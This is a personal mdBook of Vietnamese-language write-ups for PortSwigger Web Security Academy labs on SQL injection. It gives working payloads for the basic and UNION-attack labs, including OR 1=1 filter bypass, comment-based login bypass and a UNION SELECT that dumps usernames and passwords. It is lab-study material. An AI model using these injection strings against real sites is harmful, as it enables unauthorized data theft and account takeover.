<!DOCTYPE HTML>
<html lang="en" class="ayu sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>PortSwigger Web Security Academy Solutions</title>
        <meta name="robots" content="noindex">


        <!-- Custom HTML head -->

        <meta name="description" content="Comprehensive solutions and write-ups for PortSwigger Web Security Academy labs. Step-by-step guides covering XSS, SQL Injection, OAuth, File Upload vulnerabilities, and more. Educational content for learning web security through hands-on practice.">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="favicon.svg">
        <link rel="shortcut icon" href="favicon.png">
        <link rel="stylesheet" href="css/variables.css">
        <link rel="stylesheet" href="css/general.css">
        <link rel="stylesheet" href="css/chrome.css">
        <link rel="stylesheet" href="css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" id="mdbook-highlight-css" href="highlight.css">
        <link rel="stylesheet" id="mdbook-tomorrow-night-css" href="tomorrow-night.css">
        <link rel="stylesheet" id="mdbook-ayu-highlight-css" href="ayu-highlight.css">

        <!-- Custom theme stylesheets -->
        <link rel="stylesheet" href="theme/css/image-zoom.css">


        <!-- Provide site root and default themes to javascript -->
        <script>
            const path_to_root = "";
            const default_light_theme = "ayu";
            const default_dark_theme = "ayu";
            window.path_to_searchindex_js = "searchindex.js";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="toc.js"></script>
    </head>
    <body>
    <div id="mdbook-help-container">
        <div id="mdbook-help-popup">
            <h2 class="mdbook-help-title">Keyboard shortcuts</h2>
            <div>
                <p>Press <kbd>←</kbd> or <kbd>→</kbd> to navigate between chapters</p>
                <p>Press <kbd>S</kbd> or <kbd>/</kbd> to search in the book</p>
                <p>Press <kbd>?</kbd> to show this help</p>
                <p>Press <kbd>Esc</kbd> to hide this help</p>
            </div>
        </div>
    </div>
    <div id="mdbook-body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                let theme = localStorage.getItem('mdbook-theme');
                let sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            const default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? default_dark_theme : default_light_theme;
            let theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('ayu')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="mdbook-sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            let sidebar = null;
            const sidebar_toggle = document.getElementById("mdbook-sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
                sidebar_toggle.checked = false;
            }
            if (sidebar === 'visible') {
                sidebar_toggle.checked = true;
            } else {
                html.classList.remove('sidebar-visible');
            }
        </script>

        <nav id="mdbook-sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="toc.html"></iframe>
            </noscript>
            <div id="mdbook-sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="mdbook-page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="mdbook-menu-bar-hover-placeholder"></div>
                <div id="mdbook-menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="mdbook-sidebar-toggle" class="icon-button" for="mdbook-sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="mdbook-sidebar">
                            <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M0 96C0 78.3 14.3 64 32 64H416c17.7 0 32 14.3 32 32s-14.3 32-32 32H32C14.3 128 0 113.7 0 96zM0 256c0-17.7 14.3-32 32-32H416c17.7 0 32 14.3 32 32s-14.3 32-32 32H32c-17.7 0-32-14.3-32-32zM448 416c0 17.7-14.3 32-32 32H32c-17.7 0-32-14.3-32-32s14.3-32 32-32H416c17.7 0 32 14.3 32 32z"/></svg></span>
                        </label>
                        <button id="mdbook-theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="mdbook-theme-list">
                            <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M371.3 367.1c27.3-3.9 51.9-19.4 67.2-42.9L600.2 74.1c12.6-19.5 9.4-45.3-7.6-61.2S549.7-4.4 531.1 9.6L294.4 187.2c-24 18-38.2 46.1-38.4 76.1L371.3 367.1zm-19.6 25.4l-116-104.4C175.9 290.3 128 339.6 128 400c0 3.9 .2 7.8 .6 11.6c1.8 17.5-10.2 36.4-27.8 36.4H96c-17.7 0-32 14.3-32 32s14.3 32 32 32H240c61.9 0 112-50.1 112-112c0-2.5-.1-5-.2-7.5z"/></svg></span>
                        </button>
                        <ul id="mdbook-theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-default_theme">Auto</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="mdbook-theme-ayu">Ayu</button></li>
                        </ul>
                        <button id="mdbook-search-toggle" class="icon-button" type="button" title="Search (`/`)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="/ s" aria-controls="mdbook-searchbar">
                            <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M416 208c0 45.9-14.9 88.3-40 122.7L502.6 457.4c12.5 12.5 12.5 32.8 0 45.3s-32.8 12.5-45.3 0L330.7 376c-34.4 25.2-76.8 40-122.7 40C93.1 416 0 322.9 0 208S93.1 0 208 0S416 93.1 416 208zM208 352c79.5 0 144-64.5 144-144s-64.5-144-144-144S64 128.5 64 208s64.5 144 144 144z"/></svg></span>
                        </button>
                    </div>

                    <h1 class="menu-title">PortSwigger Web Security Academy Solutions</h1>

                    <div class="right-buttons">
                        <a href="print.html" title="Print this book" aria-label="Print this book">
                            <span class=fa-svg id="print-button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M128 0C92.7 0 64 28.7 64 64v96h64V64H354.7L384 93.3V160h64V93.3c0-17-6.7-33.3-18.7-45.3L400 18.7C388 6.7 371.7 0 354.7 0H128zM384 352v32 64H128V384 368 352H384zm64 32h32c17.7 0 32-14.3 32-32V256c0-35.3-28.7-64-64-64H64c-35.3 0-64 28.7-64 64v96c0 17.7 14.3 32 32 32H64v64c0 35.3 28.7 64 64 64H384c35.3 0 64-28.7 64-64V384zm-16-88c-13.3 0-24-10.7-24-24s10.7-24 24-24s24 10.7 24 24s-10.7 24-24 24z"/></svg></span>
                        </a>
                        <a href="https://github.com/nh4ttruong/portswigger" title="Git repository" aria-label="Git repository">
                            <span class=fa-svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg></span>
                        </a>

                    </div>
                </div>

                <div id="mdbook-search-wrapper" class="hidden">
                    <form id="mdbook-searchbar-outer" class="searchbar-outer">
                        <div class="search-wrapper">
                            <input type="search" id="mdbook-searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="mdbook-searchresults-outer" aria-describedby="searchresults-header">
                            <div class="spinner-wrapper">
                                <span class=fa-svg id="fa-spin"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc. --><path d="M304 48c0-26.5-21.5-48-48-48s-48 21.5-48 48s21.5 48 48 48s48-21.5 48-48zm0 416c0-26.5-21.5-48-48-48s-48 21.5-48 48s21.5 48 48 48s48-21.5 48-48zM48 304c26.5 0 48-21.5 48-48s-21.5-48-48-48s-48 21.5-48 48s21.5 48 48 48zm464-48c0-26.5-21.5-48-48-48s-48 21.5-48 48s21.5 48 48 48s48-21.5 48-48zM142.9 437c18.7-18.7 18.7-49.1 0-67.9s-49.1-18.7-67.9 0s-18.7 49.1 0 67.9s49.1 18.7 67.9 0zm0-294.2c18.7-18.7 18.7-49.1 0-67.9S93.7 56.2 75 75s-18.7 49.1 0 67.9s49.1 18.7 67.9 0zM369.1 437c18.7 18.7 49.1 18.7 67.9 0s18.7-49.1 0-67.9s-49.1-18.7-67.9 0s-18.7 49.1 0 67.9z"/></svg></span>
                            </div>
                        </div>
                    </form>
                    <div id="mdbook-searchresults-outer" class="searchresults-outer hidden">
                        <div id="mdbook-searchresults-header" class="searchresults-header"></div>
                        <ul id="mdbook-searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('mdbook-sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('mdbook-sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#mdbook-sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="mdbook-content" class="content">
                    <main>
                        <h1 id="portswigger-academy-journey"><a class="header" href="#portswigger-academy-journey">PortSwigger Academy Journey</a></h1>
<p>This repository documents my self-study journey through the <a href="https://portswigger.net/web-security">PortSwigger Academy</a> labs. It serves as a personal learning guide, covering various web security vulnerabilities and my solutions.</p>
<p><img src="portswigger-lab.png" alt="PortSwigger Lab"></p>
<h2 id="covered-vulnerabilities"><a class="header" href="#covered-vulnerabilities">Covered Vulnerabilities</a></h2>
<p>This repository explores the following vulnerability categories:</p>
<ul>
<li><strong><a href="sql-injection">SQL Injection</a></strong>: Techniques for exploiting SQL injection vulnerabilities, including basic attacks, blind SQLi, and database examination.</li>
<li><strong><a href="xss">Cross-Site Scripting (XSS)</a></strong>: A deep dive into reflected and stored XSS attacks, with various contexts and bypasses.</li>
<li><strong><a href="file-upload">File Upload Vulnerabilities</a></strong>: Methods for bypassing file upload restrictions to achieve Remote Code Execution (RCE).</li>
<li><strong><a href="oauth">OAuth 2.0 Vulnerabilities</a></strong>: Exploiting flawed OAuth 2.0 implementations, including hijacking, implicit flow, and redirect stealing.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="sql-injection"><a class="header" href="#sql-injection">SQL Injection</a></h1>
<h2 id="đôi-nét-về-sql-injection-sqli"><a class="header" href="#đôi-nét-về-sql-injection-sqli">Đôi nét về SQL Injection (SQLi)?</a></h2>
<p>SQLi là một lỗ hổng trên web mà attacker sẽ có thể tạo ra những query đến database của website đó. Lỗ hổng này sẽ làm những dữ liệu mà khó có thể xem được một cách bình thường trở nên bị leak.</p>
<p>Lỗ hổng này khá rộng. Nó có thể ảnh hưởng trực tiếp đến user data và cả web database nếu attack muốn (có thể thêm, xóa, sửa,…)</p>
<p>Nếu attacker có thể khai thác được SQLi thì có thể dẫn đến nhiều hệ lụy khôn lường. Ví dụ như dữ liệu bị lộ (tài khoản người dùng, thông tin cá nhân,…). Điều này trở nên hết sức phức tạp vì sẽ liên quan đến nhiều khía cạnh bảo mật trên môi trường Internet.</p>
<h2 id="các-tác-động-của-sqli"><a class="header" href="#các-tác-động-của-sqli">Các tác động của SQLi</a></h2>
<p>Để dễ hình dung hơn, SQLi có thể khiến:</p>
<ul>
<li>Làm lộ những dữ liệu mật</li>
<li>Phá vỡ logic thực thi của web app</li>
<li>Lộ những database khác (trong vùng khác vùng mà bị SQLi)</li>
<li>Lộ cấu trúc của web app</li>
<li>Và còn nhiều vấn đề khác mà attacker có thể sử dụng để khai thác web app của bạn</li>
</ul>
<h2 id="labs---danh-sách-các-bài-thực-hành"><a class="header" href="#labs---danh-sách-các-bài-thực-hành">Labs - Danh sách các bài thực hành</a></h2>
<h3 id="1-basic-attacks"><a class="header" href="#1-basic-attacks">1. Basic Attacks</a></h3>
<p><a href="sql-injection/basic-attacks/README.html">Các kỹ thuật SQLi cơ bản</a></p>
<ul>
<li><a href="#lab-sql-injection-vulnerability-in-where-clause-allowing-retrieval-of-hidden-data">Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</a></li>
<li><a href="#lab-sql-injection-vulnerability-allowing-login-bypass">Lab: SQL injection vulnerability allowing login bypass</a></li>
</ul>
<h3 id="2-union-attacks"><a class="header" href="#2-union-attacks">2. UNION Attacks</a></h3>
<p><a href="sql-injection/union-attacks/README.html">Các kỹ thuật SQLi UNION attack</a></p>
<ul>
<li><a href="#lab-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query">Lab: SQL injection UNION attack, determining the number of columns</a></li>
<li><a href="#lab-sql-injection-union-attack-finding-a-column-containing-text">Lab: SQL injection UNION attack, finding a column containing text</a></li>
<li><a href="#lab-sql-injection-union-attack-retrieving-data-from-other-tables">Lab: SQL injection UNION attack, retrieving data from other tables</a></li>
<li><a href="#lab-sql-injection-union-attack-retrieving-multiple-values-in-a-single-column">Lab: SQL injection UNION attack, retrieving multiple values in a single column</a></li>
</ul>
<h3 id="3-examining-database"><a class="header" href="#3-examining-database">3. Examining Database</a></h3>
<p><a href="sql-injection/examining-database/README.html">Kỹ thuật kiểm tra và liệt kê database</a></p>
<ul>
<li><a href="#lab-sql-injection-attack-querying-the-database-type-and-version-on-oracle">Lab: SQL injection attack, querying the database type and version on Oracle</a></li>
<li><a href="#lab-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft">Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft</a></li>
<li><a href="#lab-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases">Lab: SQL injection attack, listing the database contents on non-Oracle databases</a></li>
<li><a href="#lab-sql-injection-attack-listing-the-database-contents-on-oracle">Lab: SQL injection attack, listing the database contents on Oracle</a></li>
</ul>
<h3 id="4-blind-sql-injection"><a class="header" href="#4-blind-sql-injection">4. Blind SQL Injection</a></h3>
<p><a href="sql-injection/blind-sqli/README.html">Kỹ thuật Blind SQLi - Tấn công “mù”</a></p>
<ul>
<li><a href="#lab-blind-sql-injection-with-conditional-responses">Lab: Blind SQL injection with conditional responses</a></li>
<li><a href="#lab-blind-sql-injection-with-conditional-errors">Lab: Blind SQL injection with conditional errors</a></li>
<li><a href="#lab-blind-sql-injection-with-time-delays">Lab: Blind SQL injection with time delays</a></li>
<li><a href="#lab-blind-sql-injection-with-time-delays-and-information-retrieval">Lab: Blind SQL injection with time delays and information retrieval</a></li>
</ul>
<h2 id="một-số-cách-để-nhận-dạng-lỗ-hổng-sqli"><a class="header" href="#một-số-cách-để-nhận-dạng-lỗ-hổng-sqli">Một số cách để nhận dạng lỗ hổng SQLi</a></h2>
<ul>
<li>Thử với ký tự <code>'</code> để kiểm tra syntax error</li>
<li>Thử thay đổi cấu trúc syntax để xem phản hồi</li>
<li>Thử bằng toán tử boolean (<code>OR 1=1</code>, <code>AND 1=2</code>)</li>
<li>Trigger time delay để xác nhận blind SQLi</li>
<li>Sử dụng UNION SELECT để trích xuất dữ liệu</li>
</ul>
<h2 id="tài-nguyên-tham-khảo"><a class="header" href="#tài-nguyên-tham-khảo">Tài nguyên tham khảo</a></h2>
<ul>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">PortSwigger SQL Injection Cheat Sheet</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection">PortSwigger SQL Injection Learning Path</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="sql-injection---basic-attacks"><a class="header" href="#sql-injection---basic-attacks">SQL Injection - Basic Attacks</a></h1>
<p>Hai vấn đề này được xem là những vấn đề cơ bản nhất trong tấn công SQLi.</p>
<h2 id="labs"><a class="header" href="#labs">Labs</a></h2>
<ul>
<li><a href="#lab-sql-injection-vulnerability-in-where-clause-allowing-retrieval-of-hidden-data">Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</a></li>
<li><a href="#lab-sql-injection-vulnerability-allowing-login-bypass">Lab: SQL injection vulnerability allowing login bypass</a></li>
</ul>
<h2 id="tổng-quan"><a class="header" href="#tổng-quan">Tổng quan</a></h2>
<p>SQL Injection cơ bản tập trung vào việc khai thác các lỗ hổng đơn giản trong việc xử lý input của ứng dụng web. Hai kỹ thuật chính là:</p>
<ol>
<li><strong>Retrieval of Hidden Data</strong>: Sử dụng SQLi để hiển thị dữ liệu ẩn bằng cách thêm điều kiện <code>OR 1=1</code> vào query</li>
<li><strong>Login Bypass</strong>: Bypass xác thực đăng nhập bằng cách comment phần password check với <code>--</code></li>
</ol>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="lab-sql-injection-vulnerability-in-where-clause-allowing-retrieval-of-hidden-data"><a class="header" href="#lab-sql-injection-vulnerability-in-where-clause-allowing-retrieval-of-hidden-data">Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</a></h1>
<p><strong>Lab URL:</strong> <a href="https://portswigger.net/web-security/lab-retrieve-hidden-data">PortSwigger Lab</a></p>
<h2 id="mô-tả"><a class="header" href="#mô-tả">Mô tả</a></h2>
<p>Bài lab này yêu cầu ta thực hiện SQLi để show tất cả các sản phẩm ra trong khi hiển thị một category bất kỳ.</p>
<h2 id="khai-thác"><a class="header" href="#khai-thác">Khai thác</a></h2>
<p><code>Payload của mình: "https://ac5b1feb1e123a53c0fc5396006d00c3.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories%27+OR+1=1--"</code></p>
<p>Có thể hiểu rằng, server sẽ query câu lệnh kiểu:</p>
<pre><code class="language-sql">SELECT * FROM products WHERE category = 'Clothing%2c+shoes+and+accessories' OR 1=1--
</code></pre>
<p>Sau “–” thì tất cả sẽ bị comment lại và không thể thực thi. Kết quả với câu query:</p>
<p><img src="sql-injection/basic-attacks/basic-attack/solved-retriving-data.jpg" alt="Solved retriving hidden data"></p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="lab-sql-injection-vulnerability-allowing-login-bypass"><a class="header" href="#lab-sql-injection-vulnerability-allowing-login-bypass">Lab: SQL injection vulnerability allowing login bypass</a></h1>
<p><strong>Lab URL:</strong> <a href="https://portswigger.net/web-security/lab-login-bypass">PortSwigger Lab</a></p>
<h2 id="mô-tả-1"><a class="header" href="#mô-tả-1">Mô tả</a></h2>
<p>Bài lab này yêu cầu ta thực hiện bypass một cổng đăng nhập của website. Đây là một ví dụ rất thường thấy về lỗ hổng SQLi.</p>
<h2 id="phân-tích"><a class="header" href="#phân-tích">Phân tích</a></h2>
<p>Thông thường, ở một cổng đăng nhập, khi người dùng nhập vào 2 ô là username và password rồi click đăng nhập, server sẽ thực hiện một query đến database để xác thực thông tin đó với câu query kiểu:</p>
<pre><code class="language-sql">SELECT * FROM users WHERE username = 'tuilanhattruong' AND password = 'nhattruonghehe'
</code></pre>
<p>Như vậy, dựa vào cấu trúc của câu query như vậy, ta có thể dễ dàng thêm, xóa hoặc sửa câu query để bypass được cổng này (nếu server không triển khai bảo mật SQLi)</p>
<h2 id="khai-thác-1"><a class="header" href="#khai-thác-1">Khai thác</a></h2>
<p>Mình sẽ test thử cổng đăng nhập với <code>administrator:1 or 1=1--</code>. Tất nhiên là không thể login được. Mình sẽ sử dụng Burp để send request và kiểm tra payload của mình khi đăng nhập như thế nào. Sau khi kiểm tra, mình thấy được request khi login như sau:</p>
<p><img src="sql-injection/basic-attacks/basic-attack/test-query-login.jpg" alt="Solved retriving hidden data"></p>
<p>Thử cách khác, vậy tại sao ta không thử bypass bằng cách ngăn server xác thực mật khẩu bằng cách nhét “–” vào sau <strong>username</strong>. Mình sẽ type trực tiếp vào ô username luôn và password có thể điền bất cứ gì cũng được:</p>
<p><img src="sql-injection/basic-attacks/basic-attack/sqli-bypass-login.jpg" alt="Bypass login"></p>
<h2 id="kết-quả"><a class="header" href="#kết-quả">Kết quả</a></h2>
<p><img src="sql-injection/basic-attacks/basic-attack/solved-sqli-bypass-login.jpg" alt="Solved SQLi bypass login"></p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="sql-injection---union-attacks"><a class="header" href="#sql-injection---union-attacks">SQL Injection - UNION Attacks</a></h1>
<p>SQLi UNION attack là phương pháp SQLi sử dụng keyword “UNION” để truy vấn đến database dựa vào một truy vấn khác. Từ đó, dẫn đến khiến website show ra những thông tin ẩn hoặc khiến database bị sai khiến bởi những truy vấn hợp lệ.</p>
<h2 id="labs-1"><a class="header" href="#labs-1">Labs</a></h2>
<ul>
<li><a href="#lab-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query">Lab: SQL injection UNION attack, determining the number of columns</a></li>
<li><a href="#lab-sql-injection-union-attack-finding-a-column-containing-text">Lab: SQL injection UNION attack, finding a column containing text</a></li>
<li><a href="#lab-sql-injection-union-attack-retrieving-data-from-other-tables">Lab: SQL injection UNION attack, retrieving data from other tables</a></li>
<li><a href="#lab-sql-injection-union-attack-retrieving-multiple-values-in-a-single-column">Lab: SQL injection UNION attack, retrieving multiple values in a single column</a></li>
</ul>
<h2 id="tổng-quan-1"><a class="header" href="#tổng-quan-1">Tổng quan</a></h2>
<p>UNION attack cho phép attacker:</p>
<ul>
<li>Xác định số cột trong query gốc</li>
<li>Tìm cột chứa dữ liệu dạng text</li>
<li>Truy xuất dữ liệu từ các bảng khác</li>
<li>Kết hợp nhiều giá trị trong một cột</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="lab-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query"><a class="header" href="#lab-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query">Lab: SQL injection UNION attack, determining the number of columns returned by the query</a></h1>
<p><strong>Lab URL:</strong> <a href="https://portswigger.net/web-security/union-attacks/lab-determine-number-of-columns">PortSwigger Lab</a></p>
<h2 id="mô-tả-2"><a class="header" href="#mô-tả-2">Mô tả</a></h2>
<p>Bài lab yêu cầu ta xác định số cột trả về khi tiêm SQL để server trả về một hàng có giá trị null.</p>
<h2 id="khai-thác-2"><a class="header" href="#khai-thác-2">Khai thác</a></h2>
<p>Payload: <code>https://ac391ffa1e25ddc4c0e95d60001300d6.web-security-academy.net/filter?category=Lifestyle%27+UNION+SELECT+NULL,NULL,NULL--</code></p>
<h2 id="kết-quả-1"><a class="header" href="#kết-quả-1">Kết quả</a></h2>
<p><img src="sql-injection/union-attacks/sqli-union-attack/solved-union-attack-null-value.jpg" alt="Solved SQLi union attack with null value"></p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="lab-sql-injection-union-attack-finding-a-column-containing-text"><a class="header" href="#lab-sql-injection-union-attack-finding-a-column-containing-text">Lab: SQL injection UNION attack, finding a column containing text</a></h1>
<p><strong>Lab URL:</strong> <a href="https://portswigger.net/web-security/union-attacks/lab-find-column-containing-text">PortSwigger Lab</a></p>
<h2 id="mô-tả-3"><a class="header" href="#mô-tả-3">Mô tả</a></h2>
<p>Ở lab này, mình cần phải tìm được chuỗi theo yêu cầu của lab <strong>‘BVuEQu’</strong>.</p>
<h2 id="phân-tích-1"><a class="header" href="#phân-tích-1">Phân tích</a></h2>
<p>Với UNION Attack, ta có thể tìm một cột chứa giá trị loại “string” bằng cách thử chèn đoạn string cần tìm vào:</p>
<pre><code class="language-sql">UNION SELECT {string_can_tim},NULL,NULL--
</code></pre>
<p>{string_can_tim} có thể nằm ở bất kỳ cột nào trong database, do đó hãy thử vận may của mình bạn nhé, biết đâu những từ khóa thông dụng có thể cho ta xem được hết cả database của cột cần tìm.</p>
<h2 id="khai-thác-3"><a class="header" href="#khai-thác-3">Khai thác</a></h2>
<p><code>Payload: "https://ac861f221ec2cb3cc0b71c46008a00b5.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+NULL,%27BVuEQu%27,NULL--"</code></p>
<h2 id="kết-quả-2"><a class="header" href="#kết-quả-2">Kết quả</a></h2>
<p><img src="sql-injection/union-attacks/sqli-union-attack/solved-union-attack-finding-column.jpg" alt="Solved SQLi finding column"></p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="lab-sql-injection-union-attack-retrieving-data-from-other-tables"><a class="header" href="#lab-sql-injection-union-attack-retrieving-data-from-other-tables">Lab: SQL injection UNION attack, retrieving data from other tables</a></h1>
<p><strong>Lab URL:</strong> <a href="https://portswigger.net/web-security/union-attacks/lab-retrieve-data-from-other-tables">PortSwigger Lab</a></p>
<h2 id="mô-tả-4"><a class="header" href="#mô-tả-4">Mô tả</a></h2>
<p>Trong lab này, website chứa một table với tên là “users”. Việc của mình là tìm account của admin và login.</p>
<h2 id="khai-thác-4"><a class="header" href="#khai-thác-4">Khai thác</a></h2>
<p>Sử dụng UNION SELECT với payload, ta dễ dàng retrieve được data của bảng users:</p>
<p><img src="sql-injection/union-attacks/sqli-union-attack/database-users-table.jpg" alt="Database từ users table"></p>
<p><code>Payload: "https://ac1c1fcf1ef5e8c8c0a17e340047008c.web-security-academy.net/filter?category=Accessories%27+UNION+SELECT+username,password+FROM+users--"</code></p>
<h2 id="kết-quả-3"><a class="header" href="#kết-quả-3">Kết quả</a></h2>
<p><img src="sql-injection/union-attacks/sqli-union-attack/solved-union-attack-finding-other-table.jpg" alt="Solved SQLi finding other table"></p>
<div style="break-before: page; page-break-before: always;"></div>
